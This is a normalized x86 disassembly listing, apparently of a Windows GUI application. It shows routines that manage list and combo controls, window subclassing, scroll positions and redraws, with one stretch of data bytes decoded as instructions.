call j_sub_449348
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x20 ]
call sub_449d80
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x120 ]
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax esi
call sub_4a8038
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_48d98c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_48d98c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov esi eax
push esi
lea edi [ esi + 0x18 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea eax [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
call sub_449d2c
push 0xe
call GetSystemMetrics
add eax [ esi + 0x1c ]
mov [ esi + 0xc ] eax
push 0xd
call GetSystemMetrics
add eax [ esi + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax ebx
call sub_48d878
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
jmp r-xdata
sub_4ad8e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4ad964
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov [ ebx + 0x2d4 ] esi
mov eax ebx
call sub_496868
push esi
push 0x0
push 0x1047
push eax
call SendMessageW
jmp r-xdata
sub_4ad924
push ebx
mov ebx eax
cmp dl [ ebx + 0x3e4 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3e4 ] dl
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax ebx
call sub_496868
push 0x0
cmp [ ebx + 0x3e4 ] 0x1
cmc
sbb edx edx
push edx
push 0x109d
push eax
call SendMessageW
sub_4ad964
push ebx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov eax [ ebx + 0x2d4 ]
pop ebx
retn
mov eax ebx
call sub_496868
push 0x0
push 0x0
push 0x1048
push eax
call SendMessageW
pop ebx
retn
sub_4ad994
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x28c ]
call sub_4a81b8
push eax
lea eax [ ebx + 0x3f0 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
mov eax [ ebx + 0x28c ]
call sub_4a81b8
mov edi eax
dec edi
test edi edi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x28c ]
call sub_4a81f0
mov eax [ eax + 0x10 ]
mov edx [ ebx + 0x3f0 ]
mov [ edx + esi * 4 ] eax
inc esi
dec edi
jne r-xdata
sub_4ad9f4
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x3f0 ]
call sub_44af28
mov esi eax
mov eax [ ebx + 0x28c ]
call sub_4a81b8
cmp esi eax
jne r-xdata
push 0x0
lea eax [ ebx + 0x3f0 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_44b0f0
add esp 0x4
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x28c ]
call sub_4a81b8
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov edx esi
mov eax [ ebx + 0x28c ]
call sub_4a81f0
mov edx [ ebx + 0x3f0 ]
mov edx [ edx + esi * 4 ]
call sub_4a7ed0
inc esi
dec edi
jne r-xdata
sub_4ada68
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
movzx eax [ ebx + 0x2a4 ]
xor al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
pop ebx
retn
sub_4adaa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4ac7e0
test eax eax
jne r-xdata
push esi
push edi
movzx ecx [ ebp - 0x2 ]
movzx edx [ ebp - 0x1 ]
mov eax ebx
call sub_48ffb4
cmp [ ebx + 0x290 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4adae8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x29c ]
call sub_4254d8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x29c ]
mov edx esi
call sub_4a734c
cmp ebp [ eax + 0x28 ]
je r-xdata
sub_4adb24
push ebx
push esi
add esp 0xffffffdc
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
call sub_423048
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx esi
mov eax ebx
call sub_497b84
add esp 0x24
pop esi
pop ebx
retn
mov eax ebx
call sub_4ac538
test eax eax
je r-xdata
mov eax ebx
call sub_4ac538
lea ecx [ esp + 0x14 ]
mov dl 0x3
call sub_4a8038
lea eax [ esp + 0x14 ]
lea edx [ esp + 0xc ]
call sub_432b5c
lea edx [ esp + 0xc ]
mov ecx esp
mov eax ebx
call sub_48d98c
movzx eax [ esp ]
mov [ esp + 0x8 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0xa ] ax
mov eax [ esp + 0x8 ]
mov [ esi + 0x8 ] eax
sub_4adbac
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x55 ] 0x80
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_496868
push eax
call DefWindowProcW
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
cmp [ ebx + 0x300 ] 0x0
jne r-xdata
mov [ ebx + 0x300 ] 0x1
push 0x0
push 0x0
push 0xb04d
mov eax [ ebx + 0x2b8 ]
push eax
call PostMessageW
pop esi
pop ebx
retn
sub_4adc00
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x28c ]
call sub_4a81b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x28c ]
mov edx esi
call sub_4a81f0
xor ecx ecx
mov edx 0x3
call sub_4a7d20
inc esi
dec ebx
jne r-xdata
sub_4adc3c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x28c ]
call sub_4a81b8
mov edi eax
dec edi
test edi edi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebx ebx
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ esi + 0x28c ]
call sub_4a81f0
mov eax [ eax + 0x28 ]
push eax
mov edx ebx
mov eax [ esi + 0x28c ]
call sub_4a81f0
mov edx [ eax + 0x20 ]
mov eax [ esp + 0x4 ]
pop ecx
mov ebp [ eax ]
call [ ebp + 0xe4 ]
mov edx ebx
mov eax [ esi + 0x28c ]
call sub_4a81f0
mov edx 0x3
call sub_4a7cb0
test al al
je r-xdata
sub_4adcb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a8304
xor eax eax
push ebp
push sub_4add49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a81b8
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4add50
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a84e8
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx ebx
call sub_4a81f0
mov edx 0x3
call sub_4a7cb0
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
mov edx ebx
call sub_4a81f0
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffab
call sub_4483f8
sub_4add64
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x28c ]
call sub_4a81b8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x28c ]
mov edx esi
call sub_4a81f0
mov cl 0x1
mov edx 0x3
call sub_4a7d20
inc esi
dec ebx
jne r-xdata
sub_4adda0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a8304
xor eax eax
push ebp
push j_sub_448b58#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a82d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4addf4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28c ]
call sub_4a84e8
retn
sub_4ade00
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_497514
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_4ac408
cmp [ edi + 0x278 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_4ade64
push ebx
push esi
push edi
mov esi edx
mov ebx eax
call sub_44c2c8
call sub_44c3d4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4947a8
push 0x1
mov eax ebx
call sub_496868
push eax
call GetScrollPos
mov edi eax
mov edx esi
mov eax ebx
call sub_4947a8
push 0x1
mov eax ebx
call sub_496868
push eax
call GetScrollPos
cmp eax edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push 0xffffffff
push 0x0
mov eax ebx
call sub_496868
push eax
call InvalidateRect
jmp r-xdata
sub_4adec8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_46a430
mov edi esi
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
lea eax [ ebx + 0x10 ]
mov edx [ edi + 0x10 ]
call sub_449d2c
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4adf1c
push ebx
mov ebx eax
mov eax ebx
call sub_46a534
mov eax ebx
call sub_425180
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebx + 0x4 ]
movzx eax [ edx + 0x1d ]
cmp al 0x2
je r-xdata
mov eax edx
call sub_46a884
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_4adf50
push ebx
mov ebx eax
mov eax ebx
call sub_46a550
mov eax ebx
call sub_425180
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebx + 0x4 ]
movzx eax [ edx + 0x1d ]
cmp al 0x1
je r-xdata
mov eax edx
call sub_46a884
cmp al 0x3
jne r-xdata
pop ebx
retn
sub_4adfa4
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov [ ebx + 0x1c ] edx
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax ebx
call sub_46a55c
mov eax ebx
call sub_425180
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop ebx
retn
sub_4adfd4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42528c
mov edx esi
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
pop esi
pop ebx
retn
sub_4ae034
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax esi
call sub_4ae028
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx [ ebp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov edx [ ebp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_425180
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_4ae0b0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4256fc
mov ebp eax
mov esi ebx
mov eax edi
call sub_4254d8
mov ebx eax
dec ebx
sub ebx esi
jl r-xdata
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x30 ]
inc esi
dec ebx
jne r-xdata
sub_4ae0e8
push ebx
push esi
mov ebx edx
mov esi eax
sub cl 0x1
jb r-xdata
mov esi ebx
mov [ esi + 0x18 ] 0xffffffff
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x24 ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x10 ]
xor edx edx
call sub_449d2c
pop esi
pop ebx
retn
je r-xdata
mov eax esi
call sub_42580c
test [ eax + 0x1c ] 0x8
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
call sub_425180
push eax
push 0x144
mov eax esi
call sub_42580c
call sub_496868
push eax
call SendMessageW
sub_4ae158
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_447ae4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0xc ] eax
push esp
push 0x1
mov eax esi
call sub_42580c
call sub_496868
xor ecx ecx
mov edx 0x40d
call sub_41f0f4
test eax eax
sete al
neg al
sbb ebp ebp
mov edx edi
mov eax esi
call sub_4ae09c
mov ebx eax
mov [ esp ] 0x37
mov eax [ ebx + 0x10 ]
call sub_449db8
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_425180
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x20 ] eax
test ebp ebp
je r-xdata
sub eax 0x4
mov eax [ eax ]
push esp
mov eax esi
call sub_42580c
call sub_496868
mov ecx edi
mov edx 0x40c
call sub_41f0dc
push esp
mov eax esi
call sub_42580c
call sub_496868
mov ecx edi
mov edx 0x40b
call sub_41f0dc
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4ae284
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add [ edi - 0x1e ] ch
dec edx
add [ ecx - 0x1e ] bh
dec edx
add [ 0x47004ae2 ] bh
loop r-xdata
jb r-xdata
add [ eax + eax ] bl
add [ eax ] al
fcom [ edi + 0x44 ]
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax - 0x47 ] bl
inc esp
add [ ecx + edi * 4 + 0x44 ] ah
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ ecx + edi * 4 + 0x44 ] dh
add [ ecx + eax * 4 + 0x44 ] ah
jecxz r-xdata
add [ ecx - 0x1e ] dl
dec edx
add [ ebx - 0x1e ] bl
dec edx
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
test dl ah
dec edx
add [ eax + eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb bl ah
dec edx
add [ eax ] bl
jecxz r-xdata
nop
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
dec [ ecx + 0x2d883 ]
add [ ebx - 0x5efe4d35 ] cl
inc esp
xor ecx [ edx ]
js r-xdata
add [ eax + 0x15004481 ] ah
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
mov ecx 0x81640044
inc esp
add [ eax + 0x4ae2 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_4aeec8
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x124 ]
mov eax [ ebx + 0x29c ]
mov [ eax + 0x1c ] ebx
mov eax [ eax + 0x20 ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_4a37f4
mov ecx esi
xor edx edx
mov eax ebx
call sub_45bacc
push ebx
push sub_4ae790
call sub_42f338
mov [ ebx + 0x2d8 ] eax
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
sbb eax 0x2
add [ eax ] al
outsb
jne r-xdata
mov [ ebx + 0x2f4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
jb r-xdata
mov [ ebx + 0x2dc ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4ae5e0
mov [ ebx + 0x2f0 ] 0x0
movzx eax [ r-xdata ]
mov [ ebx + 0x2cc ] al
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add al [ eax ]
add [ ecx + 0x408b1c58 ] cl
and [ ecx + 0x2f483 ] cl
add [ edx - 0x118b5eff ] dh
inc esp
add al ch
fstp [ ebp - 0xf740007 ]
je r-xdata
call sub_448180
mov esi eax
add [ ecx + r-xdata ] esp
sub_4ae3ed
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x29c ]
call sub_4481b0
lea eax [ esi + 0x2dc ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov eax esi
call sub_496c14
test al al
je r-xdata
mov eax [ esi + 0x2d8 ]
call sub_42f3d0
lea eax [ esi + 0x2e4 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ esi + 0x2c8 ]
call sub_44b8d8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45bbcc
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xb4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_4ae474
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0xfffffcda
je r-xdata
cmp [ esi + 0x302 ] 0x0
je r-xdata
sub eax 0x2
jne r-xdata
pop esi
retn
mov edx esi
mov eax [ esi + 0x304 ]
call [ esi + 0x300 ]
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x2fa ] 0x0
je r-xdata
mov edx esi
mov eax [ esi + 0x2fc ]
call [ esi + 0x2f8 ]
pop esi
retn
sub_4ae4c8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x200
call sub_4a37c8
mov edx ebx
mov eax esi
call sub_4926c0
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_4925ec
mov eax [ ebx + 0x4 ]
or eax 0x10000
or eax 0x200000
or eax 0x2000000
or eax 0x4
or eax 0x40
movzx edx [ esi + 0x2f0 ]
or eax [ edx * 4 + rw-data ]
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfffffdff
mov eax [ ebx + 0x24 ]
or eax 0x8
and eax 0xfffffffc
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_4ae54c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x2e0 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x2e0 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x2dc ]
call sub_44fe8c
mov eax ebx
call sub_496c14
test al al
je r-xdata
mov edx [ ebx + 0x2dc ]
call sub_44fed0
mov edx ebx
mov eax [ ebx + 0x2e0 ]
call sub_42e354
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_48f2b0
mov eax ebx
call sub_492ec4
mov eax [ ebx + 0x2e0 ]
call sub_44f4cc
push eax
push 0x0
push 0x402
mov eax ebx
call sub_496868
push eax
call PostMessageW
pop esi
pop ebx
retn
sub_4ae5e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44f4cc
push eax
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_48f2b0
sub_4ae60c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_45c350
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x2f0 ] 0x2
jae r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1b8 ]
call sub_46df70
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4ae658
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_492594
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x2e0 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4ae54c
sub_4ae688
push esi
mov esi eax
mov eax esi
call sub_4902b0
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
retn
cmp [ esi + 0x2f0 ] 0x2
jae r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_4ae6b4
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_495cb0
mov eax ebx
call sub_496c14
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x2d0 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x2a0 ]
test eax eax
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
sub_4ae714
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48d12c
cmp al 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_48fcfc
mov eax ebx
call sub_48e1d8
test al al
je r-xdata
cmp [ ebx + 0x2f0 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_477028
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x278 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_48e71c
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_48e1e8
sub_4ae7a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4aead9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_45c818
push 0x5
mov eax [ ebp - 0x8 ]
call sub_496868
push eax
call GetWindow
mov ebx eax
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2a8 ] ebx
mov esi ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2d0 ] esi
push 0xfffffffc
push esi
call GetWindowLongW
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2d4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2d8 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2d0 ]
push eax
call SetWindowLongW
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x2f0 ]
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
push 0x5
mov eax [ ebp - 0x8 ]
call sub_496868
push eax
call GetWindow
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2e4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2a0 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2f0 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2e0 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x8 ]
mov [ eax + 0x2e8 ] 0x1
xor ecx ecx
push ebp
push sub_4ae9dc
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x2e4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2f4 ]
call sub_4254d8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2a0 ]
push eax
call SendMessageW
mov eax [ ebp - 0x8 ]
mov esi ebx
mov [ eax + 0x2a0 ] esi
push 0xfffffffc
push esi
call GetWindowLongW
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2ac ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2bc ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2a0 ]
push eax
call SetWindowLongW
mov eax [ ebp - 0x8 ]
mov esi ebx
mov [ eax + 0x2a4 ] esi
push 0xfffffffc
push esi
call GetWindowLongW
mov edx [ ebp - 0x8 ]
mov [ edx + 0x2b0 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c0 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2a4 ]
push eax
call SetWindowLongW
push 0x2
push ebx
call GetWindow
mov ebx eax
mov eax [ ebp - 0x8 ]
movzx edx [ eax + 0x2f1 ]
mov eax [ ebp - 0x8 ]
call sub_4aeb14
mov eax [ ebp - 0x8 ]
add eax 0x2c8
call sub_44b8d8
mov eax [ ebp - 0x8 ]
add eax 0x2c8
call sub_44b8d8
push eax
push r-xdata
push 0x1
push 0x0
mov eax [ rw-data ]
push eax
call CoCreateInstance
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2e0 ]
call sub_44f4cc
push eax
push 0x0
push 0x402
mov eax [ ebp - 0x8 ]
call sub_496868
push eax
call PostMessageW
